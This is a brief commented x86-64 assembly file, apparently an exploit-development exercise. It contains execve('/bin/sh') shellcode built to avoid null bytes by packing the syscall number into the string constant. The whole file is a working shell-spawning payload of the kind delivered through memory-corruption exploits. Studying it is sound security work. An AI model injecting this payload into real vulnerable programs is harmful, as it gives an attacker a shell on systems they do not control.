.globl _start
.section .text
_start:
    // zero out rax
    xor %rax, %rax
    // push to have array of zeroes on the stack
    pushq %rax
    // %rdi - path, %rsi and %rdx - set to the address of an empty array of no pointers.
    movq %rsp, %rsi
    movq %rsp, %rdx

    // "/bin/sh 0x2F62696E2F7368
    // needs to change to little endianess
    movq $0x68732F6E69622F3b, %rbx 
    // retrieve 0x3b, put it in low 8-bit of rax
    mov %bl, %al

    // push the string
    pushq %rbx
    // copy the stack pointer
    movq %rsp, %rdi
    // increase it by one to get past 0x3b
    inc %rdi

    syscall
